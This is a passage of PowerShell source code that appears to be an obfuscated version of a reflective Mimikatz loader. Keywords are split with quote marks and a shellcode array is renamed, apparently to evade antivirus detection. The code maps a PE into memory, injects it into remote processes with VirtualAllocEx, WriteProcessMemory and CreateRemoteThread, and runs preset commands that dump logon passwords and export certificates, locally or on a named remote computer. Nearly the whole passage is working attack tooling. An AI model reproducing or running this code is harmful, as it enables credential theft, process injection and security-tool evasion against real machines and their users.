			$Win32F'u'N'c'T'i'O'n's.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null
			
			$Win32F'u'N'c'T'i'O'n's.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
		}
	}


	## comment ; ##
	## comment ; ##
	## comment ; ##
	F'u'N'c'T'i'O'n' Get-MemoryProcAddress
	{
		Param(
		[NotANumber(Position = 0, Mandatory = $true)]
		[IntPtr]
		$PEHandle,
		
		[NotANumber(Position = 1, Mandatory = $true)]
		[String]
		$F'u'N'c'T'i'O'n'Name
		)
		
		$Win32Types = Get-Win32Types
		$Win32Constants = Get-Win32Constants
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		## comment ; ##
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
		{
			return [IntPtr]::Zero
		}
		$ExportTablePtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
		$ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)
		
		for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
		{
			## comment ; ##
			$NameOffsetPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
			$NamePtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
			$Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

			if ($Name -ceq $F'u'N'c'T'i'O'n'Name)
			{
				## comment ; ##
				## comment ; ##
				$OrdinalPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
				$FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
				$FuncOffsetAddr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEHandle) ($ExportTable.AddressOfF'u'N'c'T'i'O'n's + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
				$FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
				return A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEHandle) ($FuncOffset)
			}
		}
		
		return [IntPtr]::Zero
	}


	F'u'N'c'T'i'O'n' Invoke-MemoryLoadLibrary
	{
		Param(
		[NotANumber( Position = 0, Mandatory = $true )]
		[Byte[]]
		$PEBytes,
		
		[NotANumber(Position = 1, Mandatory = $false)]
		[String]
		$ExeArgs,
		
		[NotANumber(Position = 2, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		
		## comment ; ##
		$Win32Constants = Get-Win32Constants
		$Win32F'u'N'c'T'i'O'n's = Get-Win32F'u'N'c'T'i'O'n's
		$Win32Types = Get-Win32Types
		
		$RemoteLoading = $false
		if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$RemoteLoading = $true
		}
		
		## comment ; ##
		Write-Verbose "Getting basic PE information from the file"
		$PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
		$OriginalImageBase = $PEInfo.OriginalImageBase
		$NXCompatible = $true
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
		{
			Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
			$NXCompatible = $false
		}
		
		
		## comment ; ##
		$Process64Bit = $true
		if ($RemoteLoading -eq $true)
		{
			$Kernel32Handle = $Win32F'u'N'c'T'i'O'n's.GetModuleHandle.Invoke("kernel32.dll")
			$Result = $Win32F'u'N'c'T'i'O'n's.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
			if ($Result -eq [IntPtr]::Zero)
			{
				Throw "Couldn't locate IsWow64Process F'u'N'c'T'i'O'n' to determine if target process is 32bit or 64bit"
			}
			
			[Bool]$Wow64Process = $false
			$Success = $Win32F'u'N'c'T'i'O'n's.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
			if ($Success -eq $false)
			{
				Throw "Call to IsWow64Process failed"
			}
			
			if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
			{
				$Process64Bit = $false
			}
			
			## comment ; ##
			$PowerShell64Bit = $true
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$PowerShell64Bit = $false
			}
			if ($PowerShell64Bit -ne $Process64Bit)
			{
				throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
			}
		}
		else
		{
			if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
			{
				$Process64Bit = $false
			}
		}
		if ($Process64Bit -ne $PEInfo.PE64Bit)
		{
			Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
		}
		

		## comment ; ##
		Write-Verbose "Allocating memory for the PE and write its headers to memory"
		
		[IntPtr]$LoadAddr = [IntPtr]::Zero
		if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)
		{
			Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again" -WarningAction Continue
			[IntPtr]$LoadAddr = $OriginalImageBase
		}

		$PEHandle = [IntPtr]::Zero				## comment ; ##
		$EffectivePEHandle = [IntPtr]::Zero		## comment ; ##
		if ($RemoteLoading -eq $true)
		{
			## comment ; ##
			$PEHandle = $Win32F'u'N'c'T'i'O'n's.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			
			## comment ; ##
			$EffectivePEHandle = $Win32F'u'N'c'T'i'O'n's.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			if ($EffectivePEHandle -eq [IntPtr]::Zero)
			{
				Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
			}
		}
		else
		{
			if ($NXCompatible -eq $true)
			{
				$PEHandle = $Win32F'u'N'c'T'i'O'n's.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
			}
			else
			{
				$PEHandle = $Win32F'u'N'c'T'i'O'n's.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
			}
			$EffectivePEHandle = $PEHandle
		}
		
		[IntPtr]$PEEndAddress = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
		if ($PEHandle -eq [IntPtr]::Zero)
		{ 
			Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
		}		
		[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
		
		
		## comment ; ##
		Write-Verbose "Getting detailed PE information from the headers loaded in memory"
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name EndAddress -Value $PEEndAddress
		$PEInfo | a'D'd'-'m'E'm'B'e'R' --'m'E'm'B'e'R't'Y'p'E  NoteProperty -Name EffectivePEHandle -Value $EffectivePEHandle
		Write-Verbose "StartAddress: $PEHandle    EndAddress: $PEEndAddress"
		
		
		## comment ; ##
		Write-Verbose "Copy PE sections in to memory"
		Copy-Sections -PEBytes $PEBytes -PEInfo $PEInfo -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's -Win32Types $Win32Types
		
		
		## comment ; ##
		Write-Verbose "Update memory addresses based on where the PE was actually loaded in memory"
		Update-MemoryAddresses -PEInfo $PEInfo -OriginalImageBase $OriginalImageBase -Win32Constants $Win32Constants -Win32Types $Win32Types

		
		## comment ; ##
		Write-Verbose "Import DLL's needed by the PE we are loading"
		if ($RemoteLoading -eq $true)
		{
			Import-DllImports -PEInfo $PEInfo -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's -Win32Types $Win32Types -Win32Constants $Win32Constants -RemoteProcHandle $RemoteProcHandle
		}
		else
		{
			Import-DllImports -PEInfo $PEInfo -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's -Win32Types $Win32Types -Win32Constants $Win32Constants
		}
		
		
		## comment ; ##
		if ($RemoteLoading -eq $false)
		{
			if ($NXCompatible -eq $true)
			{
				Write-Verbose "Update memory protection flags"
				Update-MemoryProtectionFlags -PEInfo $PEInfo -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's -Win32Constants $Win32Constants -Win32Types $Win32Types
			}
			else
			{
				Write-Verbose "PE being reflectively loaded is not compatible with NX memory, keeping memory as read write execute"
			}
		}
		else
		{
			Write-Verbose "PE being loaded in to a remote process, not adjusting memory permissions"
		}
		
		
		## comment ; ##
		if ($RemoteLoading -eq $true)
		{
			[UInt32]$NumBytesWritten = 0
			$Success = $Win32F'u'N'c'T'i'O'n's.WriteProcessMemory.Invoke($RemoteProcHandle, $EffectivePEHandle, $PEHandle, [UIntPtr]($PEInfo.SizeOfImage), [Ref]$NumBytesWritten)
			if ($Success -eq $false)
			{
				Throw "Unable to write shellcode to remote process memory."
			}
		}
		
		
		## comment ; ##
		if ($PEInfo.FileType -ieq "DLL")
		{
			if ($RemoteLoading -eq $false)
			{
				Write-Verbose "Calling dllmain so the DLL knows it has been loaded"
				$DllMainPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
				$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
				$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($DllMainPtr, $DllMainDelegate)
				
				$DllMain.Invoke($PEInfo.PEHandle, 1, [IntPtr]::Zero) | Out-Null
			}
			else
			{
				$DllMainPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($EffectivePEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			
				if ($PEInfo.PE64Bit -eq $true)
				{
					## comment ; ##
					$ThisIsNotTheStringYouAreLookingFor = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
				}
				else
				{
					## comment ; ##
					$ThisIsNotTheStringYouAreLookingFor = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
					$CallDllMainSC2 = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
					$CallDllMainSC3 = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
				}
				$SCLength = $ThisIsNotTheStringYouAreLookingFor.Length + $CallDllMainSC2.Length + $CallDllMainSC3.Length + ($PtrSize * 2)
				$SCPSMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
				$SCPSMemOriginal = $SCPSMem
				
				w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $ThisIsNotTheStringYouAreLookingFor -MemoryAddress $SCPSMem
				$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($ThisIsNotTheStringYouAreLookingFor.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($EffectivePEHandle, $SCPSMem, $false)
				$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
				w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $CallDllMainSC2 -MemoryAddress $SCPSMem
				$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($CallDllMainSC2.Length)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr($DllMainPtr, $SCPSMem, $false)
				$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($PtrSize)
				w'R'i'T'e'-'b'Y't'E's'T'o'M'e'M'o'R'y -Bytes $CallDllMainSC3 -MemoryAddress $SCPSMem
				$SCPSMem = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $SCPSMem ($CallDllMainSC3.Length)
				
				$RSCAddr = $Win32F'u'N'c'T'i'O'n's.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
				if ($RSCAddr -eq [IntPtr]::Zero)
				{
					Throw "Unable to allocate memory in the remote process for shellcode"
				}
				
				$Success = $Win32F'u'N'c'T'i'O'n's.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
				if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
				{
					Throw "Unable to write shellcode to remote process memory."
				}

				$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's
				$Result = $Win32F'u'N'c'T'i'O'n's.WaitForSingleObject.Invoke($RThreadHandle, 20000)
				if ($Result -ne 0)
				{
					Throw "Call to CreateRemoteThread to call GetProcAddress failed."
				}
				
				$Win32F'u'N'c'T'i'O'n's.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
			}
		}
		elseif ($PEInfo.FileType -ieq "EXE")
		{
			## comment ; ##
			[IntPtr]$ExeDoneBytePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
			[System.Runtime.InteropServices.Marshal]::WriteByte($ExeDoneBytePtr, 0, 0x00)
			$OverwrittenMemInfo = Update-ExeF'u'N'c'T'i'O'n's -PEInfo $PEInfo -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's -Win32Constants $Win32Constants -ExeArguments $ExeArgs -ExeDoneBytePtr $ExeDoneBytePtr

			## comment ; ##
			## comment ; ##
			[IntPtr]$ExeMainPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
			Write-Verbose "Call EXE Main F'u'N'c'T'i'O'n'. Address: $ExeMainPtr. Creating thread for the EXE to run in."

			$Win32F'u'N'c'T'i'O'n's.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, $ExeMainPtr, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null

			while($true)
			{
				[Byte]$ThreadDone = [System.Runtime.InteropServices.Marshal]::ReadByte($ExeDoneBytePtr, 0)
				if ($ThreadDone -eq 1)
				{
					Copy-ArrayOfMemAddresses -CopyInfo $OverwrittenMemInfo -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's -Win32Constants $Win32Constants
					Write-Verbose "EXE thread has completed."
					break
				}
				else
				{
					Start-Sleep -Seconds 1
				}
			}
		}
		
		return @($PEInfo.PEHandle, $EffectivePEHandle)
	}
	
	
	F'u'N'c'T'i'O'n' Invoke-MemoryFreeLibrary
	{
		Param(
		[NotANumber(Position=0, Mandatory=$true)]
		[IntPtr]
		$PEHandle
		)
		
		## comment ; ##
		$Win32Constants = Get-Win32Constants
		$Win32F'u'N'c'T'i'O'n's = Get-Win32F'u'N'c'T'i'O'n's
		$Win32Types = Get-Win32Types
		
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		
		## comment ; ##
		if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				
				## comment ; ##
				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done unloading the libraries needed by the PE"
					break
				}

				$ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name)))
				$ImportDllHandle = $Win32F'u'N'c'T'i'O'n's.GetModuleHandle.Invoke($ImportDllPath)

				if ($ImportDllHandle -eq $null)
				{
					Write-Warning "Error getting DLL handle in MemoryFreeLibrary, DLLName: $ImportDllPath. Continuing anyways" -WarningAction Continue
				}
				
				$Success = $Win32F'u'N'c'T'i'O'n's.FreeLibrary.Invoke($ImportDllHandle)
				if ($Success -eq $false)
				{
					Write-Warning "Unable to free library: $ImportDllPath. Continuing anyways." -WarningAction Continue
				}
				
				$ImportDescriptorPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
		
		## comment ; ##
		Write-Verbose "Calling dllmain so the DLL knows it is being unloaded"
		$DllMainPtr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd ($PEInfo.PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
		$DllMainDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr]) ([Bool])
		$DllMain = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($DllMainPtr, $DllMainDelegate)
		
		$DllMain.Invoke($PEInfo.PEHandle, 0, [IntPtr]::Zero) | Out-Null
		
		
		$Success = $Win32F'u'N'c'T'i'O'n's.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
		if ($Success -eq $false)
		{
			Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
		}
	}


	F'u'N'c'T'i'O'n' Main
	{
		$Win32F'u'N'c'T'i'O'n's = Get-Win32F'u'N'c'T'i'O'n's
		$Win32Types = Get-Win32Types
		$Win32Constants =  Get-Win32Constants
		
		$RemoteProcHandle = [IntPtr]::Zero
	
		## comment ; ##
		if (($ProcId -ne $null) -and ($ProcId -ne 0) -and ($ProcName -ne $null) -and ($ProcName -ne ""))
		{
			Throw "Can't supply a ProcId and ProcName, choose one or the other"
		}
		elseif ($ProcName -ne $null -and $ProcName -ne "")
		{
			$Processes = @(Get-Process -Name $ProcName -ErrorAction SilentlyContinue)
			if ($Processes.Count -eq 0)
			{
				Throw "Can't find process $ProcName"
			}
			elseif ($Processes.Count -gt 1)
			{
				$ProcInfo = Get-Process | where { $_.Name -eq $ProcName } | Select-Object ProcessName, Id, SessionId
				W'r'i't'e'-'O'u't'p'u't' $ProcInfo
				Throw "More than one instance of $ProcName found, please specify the process ID to inject in to."
			}
			else
			{
				$ProcId = $Processes[0].ID
			}
		}
		
		## comment ; ##
		## comment ; ##
## comment ; ##
## comment ; ##
## comment ; ##
## comment ; ##
## comment ; ##
		
		if (($ProcId -ne $null) -and ($ProcId -ne 0))
		{
			$RemoteProcHandle = $Win32F'u'N'c'T'i'O'n's.OpenProcess.Invoke(0x001F0FFF, $false, $ProcId)
			if ($RemoteProcHandle -eq [IntPtr]::Zero)
			{
				Throw "Couldn't obtain the handle for process ID: $ProcId"
			}
			
			Write-Verbose "Got the handle for the remote process to inject in to"
		}
		

		## comment ; ##
		Write-Verbose "Calling Invoke-MemoryLoadLibrary"

        try
        {
            $Processors = Get-WmiObject -Class Win32_Processor
        }
        catch
        {
            throw ($_.Exception)
        }

        if ($Processors -is [array])
        {
            $Processor = $Processors[0]
        } else {
            $Processor = $Processors
        }

        if ( ( $Processor.AddressWidth) -ne (([System.IntPtr]::Size)*8) )
        {
            Write-Verbose ( "Architecture: " + $Processor.AddressWidth + " Process: " + ([System.IntPtr]::Size * 8))
            Write-Error "PowerShell architecture (32bit/64bit) doesn't match OS architecture. 64bit PS must be used on a 64bit OS." -ErrorAction Stop
        }

        ## comment ; ##
        if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8)
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes64)
        }
        else
        {
            [Byte[]]$PEBytes = [Byte[]][Convert]::FromBase64String($PEBytes32)
        }
        $PEBytes[0] = 0
        $PEBytes[1] = 0
		$PEHandle = [IntPtr]::Zero
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs
		}
		else
		{
			$PELoadedInfo = Invoke-MemoryLoadLibrary -PEBytes $PEBytes -ExeArgs $ExeArgs -RemoteProcHandle $RemoteProcHandle
		}
		if ($PELoadedInfo -eq [IntPtr]::Zero)
		{
			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] ## comment ; ##
		
		
		## comment ; ##
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			## comment ; ##
			## comment ; ##
			## comment ; ##
                    Write-Verbose "Calling F'u'N'c'T'i'O'n' with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -F'u'N'c'T'i'O'n'Name "powershell_reflective_mimikatz"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find F'u'N'c'T'i'O'n' address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForF'u'N'c'T'i'O'n'Pointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        W'r'i't'e'-'O'u't'p'u't' $Output
				        $Win32F'u'N'c'T'i'O'n's.LocalFree.Invoke($OutputPtr);
				    }
			## comment ; ##
			## comment ; ##
			## comment ; ##
		}
		## comment ; ##
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -F'u'N'c'T'i'O'n'Name "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = A'd'd'-'S'i'g'n'e'd'I'n't'A's'U'n's'i'g'n'e'd $VoidFuncAddr $RemotePEHandle
			
			## comment ; ##
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32F'u'N'c'T'i'O'n's $Win32F'u'N'c'T'i'O'n's
		}
		
		## comment ; ##
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			## comment ; ##
			$Success = $Win32F'u'N'c'T'i'O'n's.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

## comment ; ##
F'u'N'c'T'i'O'n' Main
{
	if (($PSCmdlet.MyInvocation.BoundNotANumbers["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundNotANumbers["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	

	if ($PsCmdlet.NotANumberSetName -ieq "DCJoe")
	{
		$ExeArgs = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.NotANumberSetName -ieq "DCJoes")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

    ## comment ; ##
    ## comment ; ##
    ## comment ; ##

    ## comment ; ##
    ## comment ; ##
    ## comment ; ##

	if ($ComputerName -eq $null -or $ComputerName -imatch "^\s*$")
	{
		I'n'v'o'k'e'-'C'o'm'm'a'n'd' -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs)
	}
	else
	{
		I'n'v'o'k'e'-'C'o'm'm'a'n'd' -ScriptBlock $RemoteScriptBlock -ArgumentList @($PEBytes64, $PEBytes32, "Void", 0, "", $ExeArgs) -ComputerName $ComputerName
	}
}

Main
}